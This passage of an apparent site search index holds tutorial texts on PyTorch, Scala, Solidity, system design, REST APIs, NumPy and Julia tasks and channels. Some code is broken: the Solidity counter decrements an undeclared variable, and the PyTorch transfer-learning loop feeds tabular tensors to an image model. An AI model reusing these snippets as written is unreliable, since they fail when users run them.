                content: "Introduction to PyTorch linkPyTorch is a popular open-source machine learning library developed by Facebook’s AI Research lab (FAIR). Known for its flexibility, ease of use, and dynamic computational graphs, PyTorch has become a go-to framework for both research and production in the field of deep learning.\nKey Features of PyTorch linkPyTorch stands out due to its unique features, which include:\nDynamic Computational Graphs\nPyTorch uses dynamic computational graphs (also known as define-by-run), allowing the graph to be built on-the-fly as operations are performed. This makes debugging and experimentation more intuitive compared to static graph frameworks.\nTensors and Autograd\nTensors are the core data structure in PyTorch, similar to NumPy arrays but with support for GPU acceleration. PyTorch’s autograd system automatically computes gradients, facilitating backpropagation in neural networks.\nModules and nn Package\nPyTorch provides a high-level module system through the torch.nn package, simplifying the creation and management of neural network layers and models.\nCUDA Support\nPyTorch integrates seamlessly with NVIDIA’s CUDA, enabling high-performance operations on GPUs and making it suitable for large-scale deep learning tasks.\nBasics of PyTorch linkTo get started with PyTorch, it’s essential to understand its basic components and operations.\nTensors linkTensors are multi-dimensional arrays that form the building blocks of PyTorch. They can be created and manipulated with a variety of functions.\nCreating Tensors\nimport torch # Creating a tensor from a list tensor_from_list = torch.tensor([1, 2, 3, 4]) # Creating a random tensor random_tensor = torch.randn((3, 3)) # Creating a tensor filled with zeros zero_tensor = torch.zeros((2, 2)) # Creating a tensor on the GPU gpu_tensor = torch.tensor([1, 2, 3, 4], device='cuda') Tensor Operations linkPyTorch provides a rich set of operations for manipulating tensors, including mathematical operations, indexing, and reshaping.\nBasic Operations\n# Addition result = tensor_from_list + 10 # Element-wise multiplication result = tensor_from_list * 2 # Matrix multiplication matrix1 = torch.randn((2, 3)) matrix2 = torch.randn((3, 2)) result = torch.mm(matrix1, matrix2) Autograd and Automatic Differentiation linkThe autograd package in PyTorch automatically computes gradients for tensor operations, which is crucial for training neural networks.\nUsing Autograd\n# Creating a tensor with gradient tracking x = torch.tensor(3.0, requires_grad=True) # Performing operations y = x ** 2 + 2 * x + 1 # Computing gradients y.backward() # Accessing the gradient gradient = x.grad print(gradient) # Output: tensor(8.0000) Building Neural Networks linkPyTorch’s torch.nn package provides modules and classes for constructing and training neural networks.\nDefining a Neural Network\nimport torch.nn as nn class SimpleNN(nn.Module): def __init__(self): super(SimpleNN, self).__init__() self.fc1 = nn.Linear(10, 50) self.relu = nn.ReLU() self.fc2 = nn.Linear(50, 1) def forward(self, x): x = self.fc1(x) x = self.relu(x) x = self.fc2(x) return x # Creating an instance of the network model = SimpleNN() Training a Neural Network linkTraining a neural network involves defining a loss function, an optimizer, and iterating over the training data to update the model’s parameters.\nTraining Loop Example\nimport torch.optim as optim # Loss function and optimizer criterion = nn.MSELoss() optimizer = optim.SGD(model.parameters(), lr=0.01) # Training data (dummy data for example) inputs = torch.randn((100, 10)) targets = torch.randn((100, 1)) # Training loop for epoch in range(100): # Zero the gradients optimizer.zero_grad() # Forward pass outputs = model(inputs) loss = criterion(outputs, targets) # Backward pass and optimization loss.backward() optimizer.step() if (epoch + 1) % 10 == 0: print(f'Epoch [{epoch+1}/100], Loss: {loss.item():.4f}') Advanced PyTorch Features linkBeyond the basics, PyTorch offers a range of advanced features that make it a powerful tool for deep learning.\nCustom Datasets and DataLoaders linkPyTorch provides utilities for loading and processing data through the torch.utils.data module. Custom datasets can be created by subclassing torch.utils.data.Dataset and implementing the __len__ and __getitem__ methods.\nCustom Dataset Example\nfrom torch.utils.data import Dataset, DataLoader class MyDataset(Dataset): def __init__(self, data, labels): self.data = data self.labels = labels def __len__(self): return len(self.data) def __getitem__(self, idx): return self.data[idx], self.labels[idx] # Creating a dataset and a DataLoader dataset = MyDataset(torch.randn((100, 10)), torch.randn((100, 1))) dataloader = DataLoader(dataset, batch_size=4, shuffle=True) # Iterating through the DataLoader for batch_data, batch_labels in dataloader: print(batch_data, batch_labels) Transfer Learning linkTransfer learning is a technique where a pre-trained model is fine-tuned on a new dataset. This approach can save time and resources, especially when the new dataset is small.\nTransfer Learning Example\nimport torchvision.models as models # Load a pre-trained model model = models.resnet18(pretrained=True) # Freeze all layers except the last one for param in model.parameters(): param.requires_grad = False # Replace the final layer num_features = model.fc.in_features model.fc = nn.Linear(num_features, 10) # Assuming 10 output classes # Define loss function and optimizer criterion = nn.CrossEntropyLoss() optimizer = optim.SGD(model.fc.parameters(), lr=0.001, momentum=0.9) # Training loop (simplified) for epoch in range(10): for inputs, labels in dataloader: optimizer.zero_grad() outputs = model(inputs) loss = criterion(outputs, labels) loss.backward() optimizer.step() Model Saving and Loading linkPyTorch makes it easy to save and load models, which is essential for both continuing training and deploying models.\nSaving and Loading Models\n# Save the model torch.save(model.state_dict(), 'model.pth') # Load the model model = SimpleNN() model.load_state_dict(torch.load('model.pth')) model.eval() Conclusion linkPyTorch provides a comprehensive and flexible framework for deep learning, with a focus on dynamic computational graphs, automatic differentiation, and an intuitive module system. Whether you’re a researcher or a developer, PyTorch’s powerful features and ease of use make it an excellent choice for building and training neural networks. By mastering PyTorch’s basics and leveraging its extensive ecosystem, you can develop cutting-edge machine learning models and applications.\n"
            }
        );
    index.add(
            {
                id:  35 ,
                href: "\/tutorials\/docs\/scala\/scala\/introduction_to_scala\/",
                title: "An Introduction to Scala",
                description: "Scala Lang description",
                content: "Scala, an acronym for “Scalable Language,” is a modern, multi-paradigm programming language designed to express common programming patterns in a concise, elegant, and type-safe way. It smoothly integrates features of object-oriented and functional languages.\nBrief History and Purpose linkDeveloped by Martin Odersky and released in 2003, Scala was designed to address the shortcomings of Java, particularly in terms of scalability and functional programming support. Scala runs on the Java Virtual Machine (JVM), which allows it to be interoperable with Java and makes it an attractive choice for developers familiar with Java.\nKey Features and Advantages\nInteroperability with Java: Scala seamlessly integrates with Java, allowing the mixing of Scala and Java code within applications, and it leverages Java libraries and tools.\nConciseness: Scala reduces boilerplate code, resulting in shorter, clearer, and more expressive code.\nImmutability: Scala encourages the use of immutable data, which simplifies reasoning about and parallelizing code.\nType Inference: Scala’s sophisticated type inference system reduces the need for explicit type declarations.\nFunctional Programming: Scala supports functional programming paradigms, including first-class functions, immutability, and pattern matching.\nObject-Oriented: Scala is a pure object-oriented language where every value is an object, and every operation is a method call.\nScala Basics\nSetting Up the Scala Environment linkSetting up Scala is straightforward. You need to have Java installed on your machine as Scala runs on the JVM. Here’s a step-by-step guide:\nInstall Java: Download and install Java (JRE) from the official Oracle website or use OpenJDK. Download Scala: Visit the official Scala download page and download the latest version. Install Scala: Windows: Run the installer and follow on-screen instructions. Mac/Linux: Unpack the downloaded archive and add Scala to your PATH. Verify Installation: Open a terminal or command prompt and type scala. If installed successfully, you should see a welcome message and the Scala version number. Introduction to Scala REPL\nScala comes with an interactive shell called the REPL (Read-Eval-Print Loop). The REPL is a powerful tool for learning Scala and experimenting with code snippets. To start the REPL, type scala in your terminal or command prompt.\nBasic Scala Commands\n:help: Displays a list of commands available in the REPL. :load : Loads and executes a Scala file. :quit: Exits the Scala REPL. Data Types and Variables\nScala supports basic data types such as Int, Double, Float, Long, Short, Byte, Char, String, and Boolean. Variables can be declared as immutable (using val) or mutable (using var).\nExample:\nval age: Int = 30 var name: String = \"John\" Control Structures\nScala’s control structures include if-else statements, while loops, and for loops, with concise syntax similar to Java.\nIf-Else: Scala’s if-else works as both an expression and a statement.\nval number = 10 val result = if (number % 2 == 0) \"Even\" else \"Odd\" Loops:\nWhile Loop: Used for iterating when the number of iterations is not known upfront. var i = 0 while (i \u003c 5) { println(s\"i = $i\") i += 1 } For Loop: Scala’s for loop is powerful, especially with its ability to work with ranges and collections. for (i \u003c- 1 to 5) println(s\"i = $i\") Functions and Methods\nFunctions are first-class citizens in Scala and can be defined independently of classes. Methods, on the other hand, are defined inside objects or classes.\nDefining a Function:\ndef addNumbers(a: Int, b: Int): Int = { a + b } Calling a Function:\nval sum = addNumbers(5, 10) Defining a Method:\nobject Calculator { def multiplyNumbers(a: Int, b: Int): Int = { a * b } } Calling a Method:\nval product = Calculator.multiplyNumbers(4, 5) Code Example: Simple Scala Program\nHere’s a simple Scala program demonstrating variable declarations, a control structure, and a basic Scala object with a main method:\nobject MainApp { def main(args: Array[String]): Unit = { val name: String = \"Alice\" val age: Int = 25 println(s\"Name: $name, Age: $age\") val result = if (age \u003e 18) \"Adult\" else \"Minor\" println(s\"Category: $result\") } } "
            }
        );
    index.add(
            {
                id:  36 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/introduction_to_solidity.md\/",
                title: "An Introduction To Solidity",
                description: "Learn about Solidity, basics, language syntax and more.",
                content: "What is Solidity? linkSolidity is an object-oriented programming language influenced by C++, JavaScript, and Python. It is designed to be compiled into bytecode that runs on the Ethereum Virtual Machine (EVM), which is the runtime environment for Solidity code, similar to how a browser runs JavaScript code.\nIn essence, you write smart contract code in Solidity, and the compiler converts it into bytecode. This bytecode is then deployed and stored on Ethereum (and other EVM-compatible blockchains).\nFor a basic introduction to the EVM and bytecode, you can check out this video I made.\nUnderstadning Blockchain Basics linkFor programmers, understanding blockchains is relatively straightforward. The complexities like mining, hashing, and cryptography are designed to provide specific features and promises. Similar to how you don’t need to know Amazon’s AWS internals to use it, you don’t need to delve into blockchain’s technical details to use it.\nTransactions A blockchain is a globally shared, transactional database. Anyone can read entries by joining the network, but to make changes, a transaction must be created and accepted by the network. Transactions ensure changes are either fully applied or not at all, maintaining data consistency and integrity. Each transaction is cryptographically signed by the sender to secure access and modifications.\nBlocks\nBlocks address issues like double-spend attacks by establishing a globally accepted transaction order. Transactions are bundled into blocks, executed, and distributed among all nodes. If conflicting transactions exist, only the first accepted one is valid. Blocks form a linear sequence, giving rise to the term “blockchain.” Blocks may occasionally be reverted, but the likelihood decreases as more blocks are added on top.\nEthereum Virtual Machine\nThe EVM is the runtime environment for Ethereum smart contracts. It is isolated, meaning code running inside the EVM has no access to the network, filesystem, or other processes. There are two types of accounts: external accounts (controlled by key pairs) and contract accounts (controlled by code). Both types share the same address space and have a balance in Ether.\nTransactions in EVM\nTransactions are messages from one account to another, possibly including binary data (payload) and Ether. If the target account contains code, it is executed with the payload as input. If creating a contract, the transaction’s payload is the EVM bytecode, which is executed to produce the contract’s code.\nGas Each transaction requires gas, paid by the originator, to execute. Gas incentivizes efficient use of EVM execution time and compensates executors (miners/stakers). If gas runs out during execution, an out-of-gas exception occurs, reverting state changes. The gas price is set by the transaction originator, limiting abuse and ensuring fair compensation.\nStorage, Memory, and the Stack\nThe EVM uses three data areas:\nStorage: Persistent key-value store unique to each account. Memory: Freshly cleared for each message call, linear, and costly as it grows. Stack: 1024 elements, 256-bit words, used for computations with limited top-end access. Understanding these basics will help you grasp how blockchain technology and Ethereum smart contracts function. What is a Smart Contract? linkHere’s a simple smart contract example to help you understand the basics of Solidity. It may seem basic, but it will provide you with a lot of foundational knowledge.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.18; contract Counter { uint public number; function setNumber(uint newNumber) public { number = newNumber; } // Get the current number function get() public view returns (uint) { return number; } // Increment count function increment() public { number ++; } // Function to decrement function decrement() public { count --; } } We’ll delve into details like what public and view mean shortly. For now, here are seven key learnings from the example above:\nThe first comment line (// SPDX-License-Identifier: MIT) specifies the licensing that covers the code. The pragma directive, which must be the first line of code, tells the compiler which version to use. Solidity is frequently updated, so different versions of the compiler produce different results. Semicolons are essential in Solidity; the compiler will fail if even one is missing. The contract keyword tells the compiler you’re declaring a smart contract. Functions encapsulate single ideas, specific functionality, tasks, etc. They should do one thing at a time. The number variable is a state variable, holding the contract’s state data that persists on the blockchain. Declaring Variables and Functions in Solidity linkTo understand more about the structure of Solidity, let’s break down the Counter smart contract.\nState Variable Declaration:\nuint public number; This line declares a state variable called number that can only store unsigned integers (positive whole numbers).\nFunction Declaration:\nfunction get() public view returns (uint) { return number; } This function returns the value of the state variable number. You might already be familiar with this concept from Object Oriented Programming which are getters.\nVisibility Specifiers:\npublic: The function can be accessed both internally and externally. view: The function does not modify the state. State variables can also be constant or immutable:\nstring constant TEXT = \"abc\"; address immutable owner = 0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e; Constants and immutable variables can only be assigned once and cannot be modified thereafter.\nVariable Scope in Smart Contracts linkSolidity has three scopes for variables:\nState Variables: Store permanent data on the blockchain. Local Variables: Temporary data used within functions. Global Variables: Provided by Solidity, giving information about the blockchain environment and utility functions. You can distinguish these scopes as follows:\nState variables are inside the smart contract but outside any function. Local variables are within functions and not accessible outside their scope. Global variables are automatically available. Visibility Specifiers linkVisibility in Solidity refers to the accessibility of variables, functions, or contracts. There are four types:\nPublic: Accessible from anywhere. Private: Accessible only within the declaring contract. Internal: Accessible within the declaring contract and derived contracts. External: Functions that can only be called from outside the declaring contract. What are Constructors? linkA constructor is a special type of function in Solidity that is executed only once when a smart contract is created. It is used to initialize the contract’s state and set up any necessary initial parameters. Here’s an example:\ncontract Example { string public name; constructor(string memory _name) { name = _name; } } In this example, the constructor function takes a single parameter _name and assigns it to the state variable name. This initialization happens only once, at the time the contract is deployed.\nExample Use Case:\nConsider a scenario where you want to deploy a contract that represents different types of tokens. Instead of creating separate contracts for each token type, you can use a constructor to set the token’s name and symbol during deployment:\ncontract Token { string public name; string public symbol; constructor(string memory _name, string memory _symbol) { name = _name; symbol = _symbol; } } By passing the token’s name and symbol as parameters to the constructor, you can deploy multiple instances of the Token contract with different values, making the contract more versatile and efficient.\nInterfaces and Abstract Contracts linkInterfaces define a set of function signatures without implementation, while abstract contracts can have some implemented functions but must have at least one unimplemented function.\nInterface Example:\ninterface IHotFudgeSauce { function get() external view returns (uint); function increment() external; function decrement() external; } Abstract Contract Example:\nabstract contract Feline { int public age; function utterance() public virtual returns (bytes32); function setAge(int _age) public { age = _age; } } Summary linkSolidity is a powerful language for writing smart contracts on the Ethereum blockchain. Understanding its syntax, visibility specifiers, and the structure of smart contracts is crucial for developing efficient and secure blockchain applications.\n"
            }
        );
    index.add(
            {
                id:  37 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/introduction_to_system_design\/",
                title: "An Introduction to System Design",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "What is Systems Design? linkSystems Design is the process of defining the architecture, components, modules, interfaces, and data for a system to satisfy specified requirements. It involves translating user requirements into a detailed blueprint that guides the implementation phase. The goal is to create a well-organized and efficient structure that meets the intended purpose while considering factors like scalability, maintainability, and performance.\nMastering Systems Design is crucial for anyone looking to build robust and scalable systems. Through practical examples and expert insights, you’ll learn how to effectively translate user requirements into detailed designs that can be successfully implemented.\nWhy Learn System Design? linkIn any development process, be it software or any other technology, the most important stage is the design. Without the designing phase, you cannot jump to the implementation or the testing part. Systems Design not only is a vital step in the development of the system but also provides the backbone to handle exceptional scenarios because it represents the business logic of the software. It is clear that system design acts as a backbone because no matter how well the coding part is executed, it later becomes irrelevant if the corresponding design is not good.\nObjectives of Systems Design link Practicality: Targeting the audience for whom the system is designed. Accuracy: Fulfilling nearly all functional and non-functional requirements. Completeness: Meeting all user requirements. Efficiency: Optimizing resource usage to achieve high throughput and low latency. Reliability: Ensuring the system operates in a failure-free environment for a certain period. Optimization: Balancing time and space efficiency for individual components. Scalability: Adapting to changing user needs over time, ensuring long-term success. Advantages of System Design link Reduces design cost of a product. Accelerates the software development process. Saves overall time in the System Development Life Cycle (SDLC). Increases efficiency and consistency for programmers. Conserves resources. Components of Systems Design linkLoad Balancers linkLoad balancers are crucial for ensuring scalability, availability, and performance. They distribute incoming network traffic across multiple servers to prevent any single server from becoming a bottleneck.\nKey Value Stores linkThese are storage systems similar to hash tables where key-value pairs are stored. They are essential for handling large amounts of unstructured data efficiently.\nBlob Storage linkBlob storage (Binary Large Objects) is used for storing large amounts of unstructured data, such as videos and images.\nDatabases linkDatabases are organized collections of data that allow for easy access, management, and modification.\nRate Limiters linkRate limiters control the maximum number of requests a service can handle, ensuring stability and performance under high load.\nMonitoring Systems linkMonitoring systems allow administrators to track infrastructure metrics such as bandwidth, CPU usage, and network performance, ensuring the system remains healthy and responsive.\nDistributed System Messaging Queue linkThis component acts as a medium for transactions between producers and consumers in a distributed system.\nDistributed Unique ID Generator linkIn large distributed systems, a unique ID generator assigns tags to distinguish multiple concurrent tasks.\nDistributed Search linkCrucial for retrieving information across websites, distributed search systems help users find what they need efficiently.\nDistributed Logging Services linkThese services trace sequences of events from end to end, providing insights into system performance and troubleshooting issues.\nDistributed Task Scheduler linkA scheduler manages computational resources such as CPU, memory, and storage, ensuring efficient task execution.\nSystem Design Life Cycle (SDLC) linkThe System Design Life Cycle (SDLC) outlines the steps involved in designing and developing a system, whether it’s a software application, hardware solution, or an integrated system combining both. The phases guide engineers through creating a system that meets user needs and organizational goals, ensuring the end product is reliable, scalable, and maintainable.\nPhases of the SDLC link Planning Feasibility Study System Design Implementation Testing Deployment Maintenance and Support System Architecture linkSoftware architecture defines how the components of a design are depicted and deployed. It serves as the skeleton of a software system, detailing components, abstraction levels, and other critical aspects. Understanding system architecture helps in laying out the business logic and goals of a project clearly.\nSystem Architecture Patterns linkDifferent predefined organizations of components in software architectures are known as architecture patterns. Each pattern is designed to solve specific problems in software architecture. Common patterns include:\nLayered Pattern Client-Server Pattern Event-Driven Pattern Microkernel Pattern Microservices Pattern Modularity and Interfaces in Systems Design linkModular Design linkModular design involves integrating smaller, independent elements to create a finished product. For instance, a car can be divided into simpler components, each developed and produced separately, then assembled into the final product.\nInterfaces in System Design linkInterfaces are the areas where users interact with the system. They include screen displays, forms for data entry, and system reports, facilitating system navigation and data collection.\nEvolution/Upgrade/Scale of an Existing System linkWith increasing tech usage, scalable systems are essential. If a system is not scalable, it may crash with an increasing user base.\nUpgrading Specifications linkThis involves improving the existing system’s components, such as upgrading RAM and disk size, without changing the overall scalability or network bandwidth.\nCreating a Distributed System linkConnecting multiple systems to handle increased load and ensure availability. This is known as horizontal scaling, distributing tasks across multiple systems.\nHow Data Flows Between Systems linkData flows between systems are represented by Data Flow Diagrams (DFDs). DFDs graphically represent the flow of data through a system, showing how it is divided into smaller portions and highlighting the data flow between these parts.\nComponents of a DFD link Square: Represents the source or destination of data. Arrow: Identifies data flow. Circle/Bubble: Represents a process transforming incoming data flow into outgoing data. Open Rectangle: Denotes a data store or temporary repository. System Design Example: Airline Reservation System linkContext-Level Flow Diagram linkTo understand the components and design of an Airline Reservation System, review its context-level flow diagram.\nDFD Explanation link Passenger, Travel Agent, Airline: Sources across which data migrates. Booking Airline Ticket: Data transmission from Passenger to Travel Agent and Airline. Seat Availability Check: Request for preferences and flight booking. Ticketing: Request fulfillment if seats are available. Reservation: Handling requests when no tickets are available. Conclusion linkSystem design is a critical aspect of developing robust and scalable systems. It involves a thorough understanding of user requirements and translating them into a detailed blueprint. By mastering system design, developers can ensure that their systems are efficient, reliable, and adaptable to changing needs, ultimately leading to successful and sustainable solutions.\n"
            }
        );
    index.add(
            {
                id:  38 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/api_architecture\/",
                title: "API Architecture: Design Best Practices for REST APIs",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "Web services have existed as long as the HTTP protocol itself. However, with the advent of cloud computing, they have become the ubiquitous method for enabling client interaction with services and data.\nAs a developer, I’ve had the opportunity to work with various SOAP services. However, my primary focus has been on REST, a resource-based architectural style for developing APIs and web services. Throughout my career, I’ve been involved in numerous projects where I’ve built, designed, and utilized APIs. While many APIs claim to be “RESTful,” adhering to the principles and constraints of REST architecture, some fall short, leading to poor implementations.\nI’ve encountered several poorly designed REST APIs with inaccurate usage of HTTP status codes, plain text responses, inconsistent schemas, and verbs in endpoints. These experiences prompted me to compile a set of best practices for designing REST APIs.\nKey Best Practices for REST API Design link1. Master the Basics of HTTP linkUnderstanding the basics of the HTTP protocol is crucial for designing a well-structured REST API. The Mozilla Developer Network offers a comprehensive overview of HTTP. Here’s a summary of HTTP concepts applied to RESTful design:\nHTTP Verbs: GET, POST, PUT, PATCH, DELETE. Resources and URIs: REST is resource-oriented, and resources are represented by URIs (e.g., /library/). Endpoints: A combination of a verb and a URI (e.g., GET: /books/). CRUD Operations: Verbs map to CRUD operations (GET=Read, POST=Create, PUT/PATCH=Update, DELETE=Delete). Status Codes: Indicate the response’s status (1xx=Informational, 2xx=Success, 3xx=Redirection, 4xx=Client Error, 5xx=Server Error). 2. Avoid Returning Plain Text linkAlthough not mandated by REST architectural style, most REST APIs conventionally use JSON for data exchange. Ensure to specify the Content-Type header as application/json to aid accurate decoding by programmatic clients.\n3. Avoid Using Verbs in URIs linkHTTP verbs should sufficiently describe the action performed on a resource. For example, instead of GET: /books/:slug/generateBookCover/, use GET: /books/:slug/bookCover/. Similarly, replace POST: /books/createNewBook/ with POST: /books/.\n4. Use Plural Nouns for Resources linkConsistently use plural nouns for resource URIs to prevent ambiguity. For example, use /books/:id/ instead of /book/:id/.\n5. Return Error Details in the Response Body linkWhen handling errors, return detailed error information in the JSON response body to aid debugging. For example:\n{ \"error\": \"Invalid payload.\", \"detail\": { \"name\": \"This field is required.\" } } 6. Pay Attention to HTTP Status Codes linkReturning appropriate HTTP status codes is critical. For instance, avoid returning 200 OK for error responses. Use meaningful status codes like 400 Bad Request for client errors.\n7. Use HTTP Status Codes Consistently linkEnsure consistent use of HTTP status codes across endpoints. For example:\nGET: 200 OK PUT: 200 OK POST: 201 Created PATCH: 200 OK DELETE: 204 No Content 8. Avoid Nesting Resources linkNesting resources can complicate URIs. Instead of GET: /authors/Cagan/books/, use query parameters like GET: /books?author=Cagan.\n9. Handle Trailing Slashes Gracefully linkChoose a convention for trailing slashes and stick to it. Implement redirects to handle clients using the wrong convention.\n10. Use Query Strings for Filtering and Pagination linkUtilize query strings for filtering and pagination. For example:\nPagination: GET: /books?page=1\u0026page_size=10 Filtering: GET: /books?published=true\u0026page=2\u0026page_size=10 11. Differentiate Between 401 Unauthorized and 403 Forbidden linkUse 401 Unauthorized when authentication credentials are missing or invalid. Use 403 Forbidden when the user lacks necessary permissions.\n12. Utilize HTTP 202 Accepted linkUse 202 Accepted when the request is accepted but not yet processed. This is useful for asynchronous processing scenarios.\n13. Use Specialized Web Frameworks for REST APIs linkChoose frameworks specifically designed for REST APIs to ensure best practices are followed effortlessly. For Python, frameworks like Falcon and Django REST Framework are excellent choices. For Node.js, consider Restify.\nConclusion linkStriving to design APIs that are a pleasure to use benefits both consumers and developers. The principles of good semantics, simplicity, and common sense are at the heart of effective REST API design. REST API design is more of an art than a science—the more you practice, the better you get. If you have alternative approaches to the tips shared above, I would love to hear them. In the meantime, keep building and improving those APIs!\n"
            }
        );
    index.add(
            {
                id:  39 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/advanced_numpy_concepts\/",
                title: "Applications and Advanced Numpy Concepts",
                description: "...",
                content: "Advanced Concepts and Applications of NumPy linkOverview linkNumPy offers advanced features and capabilities beyond basic array manipulation and arithmetic operations. These advanced concepts include broadcasting, linear algebra operations, random number generation, memory management, and integration with other libraries. Understanding these concepts and their applications is essential for mastering NumPy and leveraging its full potential in scientific computing and data analysis.\n1. Broadcasting linkBroadcasting is a powerful mechanism in NumPy that allows arrays of different shapes to be combined in arithmetic operations. It simplifies code by automatically aligning arrays with different shapes and performing element-wise operations efficiently.\nimport numpy as np # Create arrays arr1 = np.array([[1, 2, 3], [4, 5, 6]]) scalar = 10 # Broadcast scalar to match the shape of arr1 result = arr1 * scalar print(\"Result of broadcasting:\") print(result) 2. Linear Algebra Operations linkNumPy provides extensive support for linear algebra operations, including matrix multiplication, decomposition, eigenvalue calculation, and solving linear equations. These operations are essential for various mathematical and scientific applications.\nimport numpy as np # Create matrices A = np.array([[1, 2], [3, 4]]) B = np.array([[5, 6], [7, 8]]) # Matrix multiplication result = np.dot(A, B) print(\"Result of matrix multiplication:\") print(result) 3. Random Number Generation linkNumPy includes a powerful random number generation module (numpy.random) for generating random numbers from various probability distributions. This functionality is essential for tasks like simulation, statistical analysis, and random sampling.\nimport numpy as np # Generate random numbers from a normal distribution random_numbers = np.random.normal(loc=0, scale=1, size=(3, 3)) print(\"Random numbers from a normal distribution:\") print(random_numbers) 4. Memory Management linkNumPy provides tools for efficient memory management, including functions for creating arrays with pre-allocated memory (numpy.empty, numpy.zeros, numpy.ones) and functions for controlling memory layout (numpy.ravel, numpy.reshape, numpy.transpose).\nimport numpy as np # Create an uninitialized array arr = np.empty((2, 2)) print(\"Uninitialized array:\") print(arr) 5. Integration with Other Libraries linkNumPy seamlessly integrates with other scientific computing libraries in the Python ecosystem, such as SciPy, Matplotlib, and Pandas. This integration enables a cohesive workflow for data analysis, visualization, and machine learning.\nimport numpy as np import matplotlib.pyplot as plt # Generate data x = np.linspace(0, 10, 100) y = np.sin(x) # Plot data plt.plot(x, y) plt.xlabel('x') plt.ylabel('sin(x)') plt.title('Sine Function') plt.show() Conclusion linkNumPy’s advanced concepts and applications extend its capabilities beyond basic array manipulation and arithmetic operations. By mastering broadcasting, linear algebra operations, random number generation, memory management, and integration with other libraries, users can tackle complex scientific computing tasks with ease and efficiency. Understanding these advanced features is essential for leveraging NumPy’s full potential in data analysis, machine learning, and scientific research.\nFor more information, refer to the NumPy documentation.\nFeel free to adjust or expand upon this exploration of advanced concepts and applications of NumPy as needed! Let me know if there’s anything else you’d like to cover.\n"
            }
        );
    index.add(
            {
                id:  40 ,
                href: "\/tutorials\/docs\/julia\/julia\/asynchronous_programming\/",
                title: "Asynchronous Programming with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "When a program needs to interact with external systems, such as communicating with another machine over the internet, the sequence of operations may become unpredictable. For instance, if your program needs to download a file, you would initiate the download, perform other tasks while waiting for the download to complete, and then resume the code that requires the downloaded file once it’s available. This scenario is an example of asynchronous programming, also known as concurrent programming, as multiple operations appear to happen simultaneously.\nTo handle these situations, Julia provides Tasks (also referred to as symmetric coroutines, lightweight threads, cooperative multitasking, or one-shot continuations). Designating a piece of work (typically, executing a particular function) as a Task allows it to be interrupted and switched to another Task. The original Task can later be resumed from where it was paused. While this may resemble a function call, there are two crucial differences. First, task switching doesn’t use up stack space, allowing numerous task switches without affecting the call stack. Second, tasks can switch in any order, unlike function calls, where the called function must complete before control returns to the caller.\nBasic Task Operations linkA Task can be viewed as a handle to a unit of computational work. It follows a create-start-run-finish lifecycle. Tasks are created by calling the Task constructor on a zero-argument function or using the @task macro:\njulia\u003e t = @task begin; sleep(5); println(\"done\"); end Task (runnable) @0x00007f13a40c0eb0 Here, @task x is equivalent to Task(()-\u003ex).\nThis task waits for five seconds and then prints “done”. However, it hasn’t started running yet. We can start it by calling schedule:\njulia\u003e schedule(t); If you try this in the REPL, you’ll notice that schedule returns immediately because it only adds t to an internal queue of tasks to be run. The REPL then prints the next prompt and waits for more input. This idle time allows other tasks to run, so t starts. It calls sleep, sets a timer, and pauses execution. Other scheduled tasks might run during this period. After five seconds, the timer triggers and t resumes, printing “done” and then finishing.\nThe wait function blocks the calling task until another task finishes. For example, if you type:\njulia\u003e schedule(t); wait(t) instead of only calling schedule, you will observe a five-second pause before the next input prompt appears, as the REPL waits for t to finish before continuing.\nIt is often useful to create and schedule a task immediately, so the @async macro is provided for this purpose – @async x is equivalent to schedule(@task x).\nCommunicating with Channels linkIn some cases, different tasks are not naturally related by function calls; there isn’t an obvious “caller” or “callee”. An example is the producer-consumer problem, where one procedure generates values and another consumes them. The consumer cannot simply call a producer function to get a value because the producer may still be generating values and might not be ready to return. With tasks, both the producer and consumer can run as long as needed, passing values back and forth as necessary.\nJulia offers a Channel mechanism to address this issue. A Channel is a waitable first-in-first-out queue that multiple tasks can read from and write to.\nLet’s define a producer task that produces values using the put! call. To consume values, we schedule the producer to run in a new task. A special Channel constructor that accepts a one-argument function can be used to run a task bound to a channel. We can then repeatedly take! values from the channel object.\njulia\u003e function producer(c::Channel) put!(c, \"start\") for n=1:4 put!(c, 2n) end put!(c, \"stop\") end; julia\u003e chnl = Channel(producer); julia\u003e take!(chnl) \"start\" julia\u003e take!(chnl) 2 julia\u003e take!(chnl) 4 julia\u003e take!(chnl) 6 julia\u003e take!(chnl) 8 julia\u003e take!(chnl) \"stop\" Note that we did not have to explicitly close the channel in the producer. This is because the act of binding a Channel to a Task associates the open lifetime of a channel with that of the bound task. The channel object is closed automatically when the task terminates. Multiple channels can be bound to a task, and vice-versa.\nWhile the Task constructor expects a 0-argument function, the Channel method that creates a task-bound channel expects a function that accepts a single argument of type Channel. A common pattern is for the producer to be parameterized, in which case a partial function application is needed to create a 0 or 1 argument anonymous function.\nFor Task objects this can be done either directly or by use of a convenience macro:\nfunction mytask(myarg) ... end taskHdl = Task(() -\u003e mytask(7)) # or, equivalently taskHdl = @task mytask(7) To orchestrate more advanced work distribution patterns, bind and schedule can be used in conjunction with Task and Channel constructors to explicitly link a set of channels with a set of producer/consumer tasks.\nMore on Channels linkA channel can be visualized as a pipe, i.e., it has a write end and a read end :\nMultiple writers in different tasks can write to the same ch annel concurrently via put! calls. Multiple readers in different tasks can read data concurrently vi a take! calls. As an example: # Given Channels c1 and c2, c1 = Channel(32) c2 = Channel(32) # and a function `foo` which reads items from c1, processes the item read # and writes a result to c2, function foo() while true data = take!(c1) [...] # process data put!(c2, result) # write out result end end # we can schedule `n` instances of `foo` to be active concurrently. for _ in 1:n errormonitor(@async foo()) end Channels are created via the Channel{T}(sz) constructor. The channel will only hold objects of type T. If the type is not specified, the channel can hold objects of any type. sz refers to the maximum number of elements that can be held in the channel at any time. For example, Channel(32) creates a channel that can hold a maximum of 32 objects of any type. A Channel{MyType}(64) can hold up to 64 objects of MyType at any time. If a Channel is empty, readers (on a take! call) will block until data is available. If a Channel is full, writers (on a put! call) will block until space becomes available. isready tests for the presence of any object in the channel, while wait waits for an object to become available. A Channel is in an open state initially. This means that it can be read from and written to freely via take! and put! calls. close closes a Channel. On a closed Channel, put! will fail. For example: julia\u003e c = Channel(2); 